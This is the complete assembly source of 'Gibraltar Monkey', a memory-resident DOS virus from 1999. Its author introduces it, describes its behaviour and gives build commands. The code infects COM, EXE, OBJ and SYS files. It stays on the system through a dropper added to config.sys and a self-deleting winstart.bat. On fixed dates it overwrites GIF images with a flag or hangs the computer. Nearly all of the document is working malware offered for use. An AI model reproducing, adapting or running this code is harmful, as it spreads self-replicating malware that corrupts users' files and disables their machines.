;
;               Ü  ÛÛ  ßÛÛ                  ßÛÛ    Ü
;           ÜÜÜß  ÜÜÜ   ÛÛÜÜ  Ü ÜÜÜ   ÜÜÜ    ÛÛ   ÛÛ    ÜÜÜ   Ü ÜÜÜ
;          ÛÛ ÛÛ   ÛÛ   ÛÛ ÛÛ  ÛÛ ÛÛ ßßÜÛÛ   ÛÛ  ßÛÛß  ßßÜÛÛ   ÛÛ ÛÛ
;          ßÛÜÛß   ÛÛ   ÛÛ ÛÛ  ÛÛ    ÜÛ ÛÛ   ÛÛ   ÛÛ   ÜÛ ÛÛ   ÛÛ
;           ÜßÛÛÜ ÜÛÛÜ ÜÛÛÜÛß ÜÛÛ    ßÛÜßßÜ ßÛÛÜ  ßÛÜß ßÛÜßßÜ ÜÛÛ
;          ÛÛ  ÛÛ  Ü ÜÜ ÜÜÜ    ÜÜÜ  Ü ÜÜÜ    ÛÛ  ÜÛ    ÜÜÜ  ÜÜÜ ÜÜ
;          ßÛÛÜÛß   ÛÛ ÛÛ ÛÛ  ÛÛ ÛÛ  ÛÛ ÛÛ   ÛÛÜÛß   ÜÛÛ ÛÛ  ÛÛ Û
;                   ÛÛ ÛÛ ÛÛ  ÛÛ ÛÛ  ÛÛ ÛÛ   ÛÛÛÛÜ   ÛÛßßßß  ßÛÛß
;                  ÜÛÛ ÛÛ ÛÛÜ ßÛÜÛß ÜÛÛ ÛÛÜ ÜÛÛ ßÛÛÜ  ßÛÜÜß    Û
;                                                             Ûß
;                  úÄÄÄÄÄ= (c) Mister Sandman, 1999 =ÄÄÄÄÄú  ÜÛ
;                                                           Ûß
;
; ÄÄ´ Introduction ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;   Welcome to my first finished virus in my career as an independent virus
;   writer. After three years stamping the "29A" trademark, in everything i
;   could, it got pretty strange to me to sign this virus without it.
;
;   However this wasn't the only thing which changed. In fact this virus is
;   the most significative specimen of my transition... besides that i left
;   29A remains that Gibraltar Monkey is a DOS-specific virus, the last one
;   i will ever write for this platform. Also, i'm changing a bit my coding
;   style. While this feature ain't too remarkable in this virus it will be
;   a completely latent fact for sure in my next viruses. And last, but not
;   least, Gibraltar Monkey is the first of a long series of viruses, whose
;   source code i will not comment. Now that i work for my own i don't feel
;   like to spend a lot of time once my viruses are finished writing a com-
;   ment in each line of code explaining what it does... this was something
;   i used to do in 29A because of the educational purposes of the magazine
;   we edited itself, but now it doesn't have sense anymore.
;
; ÄÄ´ Description ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;   Enough for this. Going straight to what this virus *is* the first thing
;   i should say is that it's just an experiment. Don't expect to find any-
;   thing new here because, though pretty bizarre and uncommon, there's no-
;   thing in this virus nobody else has ever seen. While being in 29A i had
;   something like a moral debt, which made impossible to me to think about
;   ever writing weird viruses like this one. However it had been always my
;   wish, especially in those moments in which i used to check "Q"'s virus-
;   es, which made me feel something like an internal envy i couldn't free.
;
;   As soon as i left 29A i decided to wash up a little bit one virus i had
;   written in one of the forementioned moments, a virus i never encouraged
;   to release because it always seemed too lame to me in which concerns to
;   the self-imposed minimum quality level for 29A. I had written it in one
;   day and even didn't try whether it worked or not... i just left it lost
;   in one of my directories, and it was one couple days ago when i decided
;   to "reactivate" it. I met mad-man on Undernet #virus and i was not sur-
;   prised when he, after having tested my virus, told me something did not
;   work... it was just a matter of three minutes, i had made an error whi-
;   le restoring COM files and jumping to their original entry point. After
;   i fixed this and i checked the rest had no bugs, i knew it was the time
;   to write this text and prepare the release of my virus.
;
;   But, having a glance at the technical aspects of Gibraltar Monkey them-
;   selves, there are several things to say as well. It's a memory resident
;   DOS virus which infects COM, EXE, OBJ and SYS files. The virus, itself,
;   is completely bizarre. While i didn't write nonsense things nor a trash
;   engine which generates a lot of weird instructions, Gibraltar Monkey is
;   bizarre in which concerns to self-contradictions. Every virus has, even
;   if not deliberately, a hidden purpose. It is possible, by mean of a lo-
;   gical analysis of the viral code, to discover this purpose. For instan-
;   ce, Torero, one of my DOS viruses, was written with the purpose of tea-
;   ching two new techniques which could be useful... in fact anybody could
;   say it was just a vehicle for these specific routines i had written. In
;   Gibraltar Monkey's case, no logic can be applied to its analysis. Some-
;   body could even say its purpose is not to have any purpose :)
;
;   What i mean is, there is no logic in combining highly infectious sprea-
;   ding techniques with no polymorphism, and even no encryption... this is
;   just a very simple example of what you will find here. Apart from this,
;   it is also important to realise about the use of uncommon routines com-
;   bined with maybe the most standard ones... all the virus goes just like
;   this, being every routine carefully written, to counteract its opposite
;   one. It reaches the point of "getting such an equilibrium which is able
;   to unbalance the virus harmony". Of course, i prefer not to give a full
;   list of these features, but to encourage the reader, to check this him-
;   self, on his own, which undoubtly will be much more interesting.
;
; ÄÄ´ Behavior ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;   Gibraltar Monkey, once executed, checks for the type of host from which
;   it's being run. Normal hosts, at the start of their code create a drop-
;   per in the root directory, with a random name, which always ends with a
;   "G", and modify config.sys in order to get loaded in every boot. Later,
;   the virus checks whether there is an active copy of itself in memory or
;   not. In case there is not, it checks for the type of processor in which
;   is running. If it's not a Pentium nor a 486 it will activate SYS infec-
;   tion. Otherwise, because of some incompatibilities of possible problems
;   which might happen, SYS infection will get disabled. Once this check is
;   done the Monkey tries to go resident and then restores its host and lo-
;   gically jumps back to its original entry point, having determined befo-
;   re whether it deals with a COM or an EXE file. Gibraltar Monkey's memo-
;   ry handler just checks for internal and 4eh/4fh calls. In case the lat-
;   ter happen, the virus jumps straight to its file processing and infect-
;   ing routines, which are able to deal with COM, EXE, OBJ and SYS formats
;   comprehensively.
;
;   Body copies which were dropped from normal generations of the Monkey do
;   have a different flag, and hence a different behavior. These viral cop-
;   ies create a new virus dropper, under the name of "gbmonkey.com" in the
;   root directory. Later they create a file called "winstart.bat". It will
;   be executed every time Windows (both Win 3.1x and Win32) is started. It
;   contains some commands which execute the virus dropper gbmonkey.com and
;   later delete both this file and itself, leaving no track of any kind of
;   virus presence. This way, Gibraltar Monkey will go resident, every time
;   a Windows session is started, since the DOS functions it hooks are sha-
;   red and thus called directly from Windows.
;
;   Nothing left to say, besides of the fact that anyone can appreciate the
;   virus performs a series of actions which allow it to keep its surviving
;   cycle alive: normal copies create virus droppers which get loaded in e-
;   very boot, and these droppers at their time create new droppers, which,
;   as well, make sure to keep the virus memory resident, even when Windows
;   is started. However, having no stealthing mechanism at all makes it ea-
;   sier to detect viral activity... a new counterpoint :)
;
; ÄÄ´ Payloads ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;   Last but not least, remains to say that the virus has two different ac-
;   tivations which trigger their own payload depending on the system date.
;   The first of these activations takes place on every march 8th, the date
;   in which over 700 gibraltarians went back to the Rock after having been
;   threatened by the spanish government. The virus payload which gets tri-
;   ggered on this day trojanizes every GIF file processed by means of find
;   first and find next calls, overwriting these images, with the Gibraltar
;   flag (two horizontal frames, white + red, with a design of Calpe Castle
;   between them). This may cause, for instance, your Internet browser dis-
;   playing a lot of Gibraltar flags instead of GIF files which may be part
;   of a given website.
;
;   The other activation takes place every september 10th, trying to comme-
;   morate year 1967, when gibraltarians were submitted to a referendum, in
;   which they had to decide whether they wanted to be dependent of the UK,
;   or of Spain, having won the former. In this date, infected SYS files do
;   hang the computer once they have displayed the following message:
;
;
;            Gibraltar Monkey!
;            (A)bort, (R)etry, (I)gnore?
;
;
;   I decided to call this virus "Gibraltar Monkey" after the typical tail-
;   less monkeys which live free in Apes' Den, one of the most significati-
;   ve places in Gibraltar. Every tourist who goes to Apes' Den can't avoid
;   to be told about a tale, related with these monkeys, a tale which has a
;   lot to do with the behavior of this virus. Don't hesitate to pay a good
;   visit to this place if you have the chance, which will turn as well in-
;   to an oportunity of understanding the forementioned relationship betwe-
;   en this virus and the famous tale.
;
; ÄÄ´ Compiling it ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
; tasm /m gbmonkey.asm
; tlink /x gbmonkey.obj
; exe2bin gbmonkey.exe gbmonkey.com


                .model  tiny
                .code
                 org    0

; ÄÄ´ Virus constant data ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                .386
gib_start       label   byte
flag_size       equ     flag_end-flag_start
batch_size      equ     batch_end-batch_start
gib_mem_size    equ     gib_mem_end-gib_start
gib_file_size   equ     gib_file_end-gib_start

; ÍÍ¹ Entry point for COM files ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

com_exe_entry:  call    delta_offset
delta_offset:   pop     bp
                sub     bp,offset delta_offset

                push    es cs
                pop     ds

                cmp     byte ptr ds:[bp+host_type],'D'
                jne     drop_virus

drop_batch:     mov     ah,5bh
                xor     cx,cx
                lea     dx,ds:[bp+gbmonkey_name]
                mov     byte ptr ds:[bp+host_type],'N'
                int     21h

                xchg    bx,ax
                mov     ah,40h
                mov     cx,gib_file_size
                lea     dx,ds:[bp+gib_start]
                int     21h

                mov     ah,3eh
                int     21h

                mov     ah,5bh
                xor     cx,cx
                lea     dx,ds:[bp+winstart_bat]
                int     21h

                xchg    bx,ax
                mov     ah,40h
                mov     cx,batch_size
                lea     dx,ds:[bp+batch_start]
                int     21h

                mov     ah,3eh
                int     21h

                push    es
                pop     ds
                int     20h

; ÄÄ´ Dropper insertion in CONFIG.SYS ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

drop_virus:     mov     ax,4301h
                xor     cx,cx
                lea     dx,ds:[bp+config_sys]
                int     21h

                mov     ah,5ah
                mov     byte ptr ds:[bp+dropper_name+3],cl
                lea     dx,ds:[bp+dropper_name]
                int     21h

                xchg    bx,ax
                mov     ah,3eh
                int     21h

                add     ah,3
                int     21h

                mov     ah,5bh
                mov     byte ptr ds:[bp+dropper_name+7],'.'
                mov     byte ptr ds:[bp+dropper_name+0ah],'G'
                mov     byte ptr ds:[bp+host_type],'D'
                mov     cl,5
                int     21h

                xchg    bx,ax
                mov     ah,40h
                mov     cx,gib_file_size
                lea     dx,ds:[bp+gib_start]
                int     21h

                mov     ah,3eh
                int     21h

                mov     ax,3d02h
                mov     byte ptr ds:[bp+host_type],'N'
                lea     dx,ds:[bp+config_sys]
                int     21h

                xchg    bx,ax
                mov     ah,3fh
                mov     cx,3e8h
                lea     dx,ds:[bp+roq_da_roq]
                int     21h

                push    bp
                add     bp,ax
                cmp     byte ptr ds:[bp+roq_da_roq-3],'G'
                pop     bp
                jne     install_ok

                mov     ax,4301h
                xor     cx,cx
                lea     dx,ds:[bp+dropper_name]
                int     21h

                mov     ah,41h
                int     21h
                jmp     close_config

install_ok:     mov     ah,40h
                mov     word ptr ds:[bp+dropper_name+0bh],0a0dh
                mov     cx,15h
                lea     dx,ds:[bp+install_add]
                int     21h

close_config:   mov     ah,3eh
                int     21h

; ÄÄ´ Virus installation in memory ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

do_res_check:   mov     ax,':)'
                int     21h

                cmp     ax,';)'
                je      restore_host

                cmp     byte ptr ds:[bp+file_flag],'E'
                je      dont_do_sys

                push    ds es
check_cpu:      mov     ax,3506h
                int     21h

                push    bx es
                mov     ax,2506h
                lea     dx,ds:[bp+temp_int_6]
                int     21h

                .486
                xadd    eax,edx
                mov     ax,4

known_cpu:      pop     ds dx
                push    ax

                mov     ax,2506h
                int     21h

                pop     ax es ds
                mov     byte ptr ds:[bp+sys_infection],1

                cmp     ax,4
                jb      go_mem_res

dont_do_sys:    mov     byte ptr ds:[bp+sys_infection],0
go_mem_res:     mov     ax,es
                dec     ax
                mov     ds,ax
                xor     di,di

                cmp     byte ptr ds:[di],'Y'
                jna     restore_host

                sub     word ptr ds:[di+3],((gib_mem_size/10h)+2)
                sub     word ptr ds:[di+12h],((gib_mem_size/10h)+2)
                add     ax,word ptr ds:[di+3]
                inc     ax

                mov     ds,ax
                mov     byte ptr ds:[di],'Z'
                mov     word ptr ds:[di+1],8
                mov     word ptr ds:[di+3],((gib_mem_size/10h)+1)
                mov     dword ptr ds:[di+8],00534f44h
                inc     ax

                cld
                push    cs
                pop     ds
                mov     es,ax
                mov     cx,gib_file_size
                mov     si,bp
                rep     movsb

                push    es offset copy_vector
                retf

copy_vector:    push    ds
                mov     ds,cx
                mov     si,21h*4
                lea     di,old_int_21h
                movsd

                mov     word ptr [si-4],offset new_int_21h
                mov     word ptr [si-2],ax

                pop     ax
                mov     ds,ax
                mov     es,ax

restore_host:   cmp     byte ptr ds:[bp+file_flag],'C'
                je      restore_com

restore_exe:    pop     es                                               
                mov     ax,es                                               
                add     ax,10h                                         
                add     word ptr ds:[bp+exe_cs],ax                         

                cli                                                   
                mov     sp,word ptr ds:[bp+exe_sp]                
                add     ax,word ptr ds:[bp+exe_ss]                        
                mov     ss,ax                                           
                sti                                                  

                xor     ax,ax                                             
                xor     bx,bx                                             
                xor     cx,cx                                         
                cwd                                                        
                xor     si,si                                           
                xor     di,di                                          

                push    word ptr ds:[bp+exe_cs]                           
                push    word ptr ds:[bp+exe_ip]                          
                xor     bp,bp                                              
                retf

restore_com:    pop     si
                lea     si,word ptr cs:[bp+old_com_header]
                mov     di,100h
                push    ds di
                movsd
                movsb
                retf

; ÄÄ´ Author's trademark :) ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

virus_credits   db      0dh,0ah
                db      '[Gibraltar Monkey, by Mister Sandman]',0dh,0ah

; ÍÍ¹ Entry point for SYS files ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

gib_sys_entry:  db      68h
sys_return      dw      ?
                pusha

                call    sys_delta
sys_delta:      pop     si
                sub     si,offset sys_delta

                mov     ah,2ah
                int     21h

                cmp     dx,90ah
                jne     jump_to_host

show_message:   push    cs
                pop     ds

                mov     ah,9
                lea     dx,ds:[si+monkey_text]
                int     21h
hang_thing:     jmp     hang_thing

jump_to_host:   popa
                ret

; ÍÍ¹ Temporal interrupt 6 handler ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

temp_int_6:     pop     cx
                mov     cx,offset known_cpu
                push    cx
                iret

; ÍÍ¹ Viral interrupt 21h handler ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

new_int_21h:    cmp     ax,':)'
                jne     more_checks

                inc     ah
                iret

more_checks:    cmp     ah,4eh
                je      findfirst

                cmp     ah,4fh
                je      findnext

return_to_int:  db      0eah
old_int_21h     dw      ?,?

; ÄÄ´ Findfirst (4eh) service ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

findfirst:      pusha
                push    es cs
                pop     es

                cld
                mov     si,dx
                lea     di,file_name
                mov     word ptr cs:[file_offset],di

get_path:       lodsb
                or      al,al
                je      no_more_path

                stosb
                cmp     al,':'
                je      update_offset

                cmp     al,'\'
                jne     get_path

update_offset:  mov     word ptr cs:[file_offset],di
                jmp     get_path

no_more_path:   pop     es
                popa

; ÄÄ´ Findnext (4fh) service ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

findnext:       pushf
                call    dword ptr cs:[old_int_21h]

                pushf
                pusha
                push    ds es

lets_work:      cld
                mov     ah,2fh
                int     21h

                mov     di,word ptr cs:[file_offset]
                mov     si,bx
                add     si,1eh

                push    cs es
                pop     ds es

get_name:       lodsb
                stosb
                cmp     al,'.'
                jne     not_a_dot

                mov     word ptr cs:[dot_xy],di
not_a_dot:      or      al,al
                jne     get_name

                push    cs
                pop     ds

                lea     dx,file_name
                mov     di,word ptr ds:[dot_xy]

                push    cx dx
                mov     ah,2ah
                int     21h

                xchg    si,dx
                pop     dx cx

                cmp     si,308h
                jne     normal_checks

                cmp     word ptr ds:[di],'IG'
                je      check_gif

normal_checks:  cmp     word ptr ds:[di],'OC'
                je      check_com

                cmp     word ptr ds:[di],'XE'
                je      check_exe

                cmp     word ptr ds:[di],'BO'
                je      check_obj

                cmp     byte ptr ds:[sys_infection],1
                jne     pop_and_leave

                cmp     word ptr ds:[di],'YS'
                jne     pop_and_leave

; ÄÄ´ SYS files check routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

check_sys:      mov     ax,3d02h
                int     21h
                xchg    bx,ax

                mov     ah,3fh
                mov     cx,0ch
                lea     dx,old_sys_header
                mov     si,dx
                int     21h

                mov     eax,dword ptr ds:[si]
                inc     eax
                or      eax,eax
                jnz     close_and_pop

                call    lseek_end
                cmp     ax,(gib_file_size+3e8h)
                jbe     close_and_pop

; ÄÄ´ SYS files infection routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

infect_sys:     push    ax
                call    lseek_start

                pop     ax
                add     ax,offset gib_sys_entry
                xchg    ax,word ptr ds:[si+6]
                mov     word ptr ds:[sys_return],ax

                mov     ah,40h
                mov     cx,0ch
                mov     dx,si
                int     21h

                call    lseek_end
                mov     ah,40h
                mov     cx,gib_file_size
                lea     dx,gib_start
                int     21h

close_and_pop:  mov     ah,3eh
                int     21h

pop_and_leave:  pop     es ds
                popa
                popf
                retf    2

; ÄÄ´ OBJ files check routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

check_obj:      mov     ax,3d02h
                int     21h
                xchg    bx,ax

find_ledata:    call    read_three
                cmp     al,8ah
                jz      close_and_pop

                cmp     al,0a0h
                jnz     next_section

                cmp     dx,gib_file_size
                ja      infect_obj

next_section:   mov     ax,4201h
                xor     cx,cx
                int     21h
                jmp     find_ledata

; ÄÄ´ OBJ files infection routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

infect_obj:     sub     dx,3
                push    dx
                call    read_three

                cmp     dx,100h
                pop     dx
                jnz     next_section

                mov     ah,40h
                mov     cx,gib_file_size
                lea     dx,gib_start
                int     21h
                jmp     close_and_pop

; ÄÄ´ GIF files check routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

check_gif:      mov     ax,3d02h
                int     21h
                xchg    bx,ax

                mov     ah,3fh
                mov     cx,4
                lea     dx,gif_header
                mov     si,dx
                int     21h

                cmp     dword ptr ds:[si],'8FIG'
                jne     close_and_pop

; ÄÄ´ GIF files trojanizing routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

trojan_gif:     mov     ah,40h
                mov     cx,flag_size
                lea     dx,flag_start
                int     21h

                mov     ah,40h
                xor     cx,cx
                cwd
                int     21h
                jmp     close_and_pop

; ÄÄ´ COM files check routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

check_com:      mov     ax,3d02h
                int     21h
                xchg    bx,ax

                mov     ah,3fh
                mov     cx,5
                lea     dx,old_com_header
                int     21h

                cmp     word ptr ds:[old_com_header+3],');'
                je      close_and_pop

                call    lseek_end
                cmp     ax,(0fc17h-gib_file_size)
                jae     close_and_pop

                cmp     ax,(gib_file_size+3e8h)
                jbe     close_and_pop

; ÄÄ´ COM files infection routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

infect_com:     sub     ax,3
                mov     byte ptr ds:[file_flag],'C'
                mov     word ptr ds:[new_com_header+1],ax
                call    lseek_start

                mov     ah,40h
                mov     cx,5
                lea     dx,new_com_header
                int     21h

                call    lseek_end
                mov     ah,40h
                mov     cx,gib_file_size
                lea     dx,gib_start
                int     21h
                jmp     close_and_pop

; ÄÄ´ EXE files check routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

check_exe:      mov     ax,3d02h
                int     21h
                xchg    bx,ax

                mov     ah,3fh
                mov     cx,41h
                lea     dx,roq_da_roq
                mov     si,dx
                int     21h

                mov     ax,word ptr ds:[si]
                add     ah,al
                cmp     ah,'M'+'Z'
                jne     close_and_pop

                cmp     word ptr ds:[si+12h],');'
                je      close_and_pop

                cmp     word ptr ds:[si+1ah],0
                jne     close_and_pop

                cmp     word ptr ds:[si+1eh],'KP'
                je      close_and_pop

                call    lseek_end
                cmp     ax,(gib_file_size+3e8h)
                jbe     close_and_pop

                cmp     byte ptr ds:[si+18h],40h
                je      close_and_pop

; ÄÄ´ EXE files infection routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

infect_exe:     mov     byte ptr ds:[file_flag],'E'
                push    ax dx
                mov     cx,10h
                div     cx
                sub     ax,word ptr ds:[si+8]
                add     dx,offset com_exe_entry

                push    ax
                xchg    word ptr ds:[si+16h],ax
                mov     word ptr ds:[exe_cs],ax
                pop     ax

                push    dx
                xchg    word ptr ds:[si+14h],dx
                mov     word ptr ds:[exe_ip],dx
                pop     dx

                add     dx,offset gib_file_end+320h
                and     dl,0feh

                xchg    word ptr ds:[si+0eh],ax
                mov     word ptr ds:[exe_ss],ax

                xchg    word ptr ds:[si+10h],dx
                mov     word ptr ds:[exe_sp],dx
                pop     dx ax

                add     ax,gib_file_size
                adc     dx,0
                mov     cx,200h
                div     cx
                inc     ax
                mov     word ptr ds:[si+2],dx
                mov     word ptr ds:[si+4],ax
                mov     word ptr ds:[si+12h],');'

                mov     ah,40h
                mov     cx,gib_file_size
                lea     dx,gib_start
                int     21h

                call    lseek_start
                mov     ah,40h
                mov     cx,1ch
                mov     dx,si
                int     21h
go_away:        jmp     close_and_pop

; ÄÄ´ Payload text ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

monkey_text:    db      0dh,0ah
                db      'Gibraltar Monkey!',0dh,0ah
                db      '(A)bort, (R)etry, (I)gnore?',0dh,0ah,'$'

; ÄÄ´ Read three bytes from an OBJ file ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

read_three:     mov     ah,3fh
                mov     cx,3
                lea     dx,obj_header
                int     21h

                mov     al,byte ptr ds:[obj_header]
                mov     dx,word ptr ds:[obj_header+1]
                ret

; ÄÄ´ Lseek to the start of a file ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

lseek_start:    mov     ax,4200h
                xor     cx,cx
                cwd
                int     21h
                ret

; ÄÄ´ Lseek to the end of a file ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

lseek_end:      mov     ax,4202h
                xor     cx,cx
                cwd
                int     21h
                ret

; ÄÄ´ Gibraltar flag GIF ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

flag_start      label   byte
db  39h,61h,54h,00h,38h,00h,0c4h,0ffh,00h,0ffh,0ffh,0ffh
db  0fch,0fbh,0fbh,0fbh,97h,97h,0fah,04h,04h,0f6h,5ch,57h,0dah,0d6h,04h,0a5h
db  0d6h,0d6h,0a2h,66h,55h,9bh,9eh,9eh,99h,07h,06h,5eh,16h,15h,5ch,9ch
db  04h,4ch,88h,88h,2ch,84h,04h,1dh,1bh,1ah,00h,00h,00h,0c0h,0c0h,0c0h
db  00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
db  00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
db  00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,21h,0f9h,04h
db  01h,00h,00h,10h,00h,2ch,00h,00h,00h,00h,54h,00h,38h,00h,40h,05h
db  0ffh,20h,24h,8eh,64h,69h,9eh,68h,0aah,0aeh,2ch,0ah,0bch,70h,2ch,0cfh
db  08h,0fbh,3eh,49h,9eh,28h,0c3h,0ech,0cbh,35h,0dbh,0cbh,50h,0fah,19h,8fh
db  3eh,87h,0c0h,31h,70h,38h,14h,3ah,85h,0e2h,0e9h,40h,5ah,67h,44h,0d2h
db  75h,0bh,60h,0ech,9ah,4eh,9eh,0d3h,99h,18h,8fh,09h,0dch,6dh,76h,34h
db  68h,0bbh,0ddh,82h,74h,0ech,0e9h,76h,02h,0ah,0f4h,37h,5ch,8eh,1ch,94h
db  0f4h,80h,81h,82h,83h,75h,0bh,84h,87h,88h,7ah,04h,2dh,25h,07h,04h
db  89h,82h,8ch,23h,8eh,90h,80h,8bh,27h,48h,92h,2bh,32h,10h,71h,33h
db  9ah,2ah,2fh,45h,7ch,5ch,4ah,53h,4dh,03h,65h,00h,66h,53h,06h,0a4h
db  3fh,6bh,22h,0afh,47h,54h,3bh,0ch,03h,53h,09h,6dh,0eh,0bah,6eh,53h
db  0b3h,3eh,0b1h,10h,0c0h,3fh,54h,3ch,0a7h,63h,0bbh,60h,0aah,0c4h,32h,0c2h
db  8fh,95h,6eh,0b4h,65h,4ch,0bah,0bah,0dh,0d1h,6fh,5ch,02h,6eh,7fh,0d9h
db  0dfh,0e0h,0e1h,6fh,0a0h,2ch,03h,0d0h,6fh,8fh,97h,0e4h,29h,0e6h,96h,6dh
db  0ebh,0f0h,0f1h,0f2h,2bh,0aeh,5bh,0ebh,30h,0a9h,0eh,0ch,0bch,0ch,99h,0e4h
db  31h,25h,0eah,35h,0fbh,0c1h,0adh,5ah,13h,03h,4fh,10h,38h,38h,0d0h,85h
db  0cfh,08h,04h,30h,04h,06h,1ch,0f8h,0e3h,80h,01h,31h,63h,14h,0ach,7ah
db  0a2h,8bh,22h,40h,12h,02h,9bh,1dh,50h,40h,80h,0c7h,0eh,00h,0b8h,0f2h
db  0ffh,0e4h,0d9h,0f1h,0c4h,0a3h,28h,90h,2eh,01h,50h,53h,86h,2ah,55h,0cdh
db  54h,1ah,63h,4eh,0a4h,88h,90h,1ah,13h,32h,0c9h,98h,40h,0d1h,95h,0d3h
db  0e5h,4eh,8fh,66h,50h,95h,59h,0b0h,50h,0dfh,81h,64h,31h,01h,78h,4bh
db  54h,6ah,19h,82h,54h,05h,14h,14h,0e8h,75h,68h,56h,1bh,75h,22h,0c4h
db  0a1h,0f3h,04h,0c0h,80h,2bh,6eh,6fh,0ch,89h,0fdh,4ah,16h,06h,0dah,6eh
db  24h,0ceh,0adh,25h,94h,0a0h,80h,0dah,0b9h,89h,5ah,0b4h,0c3h,0dbh,2eh,48h
db  23h,0b9h,6bh,0d3h,0cdh,0a3h,04h,49h,80h,3ch,0c2h,89h,0ch,0cfh,5bh,0cch
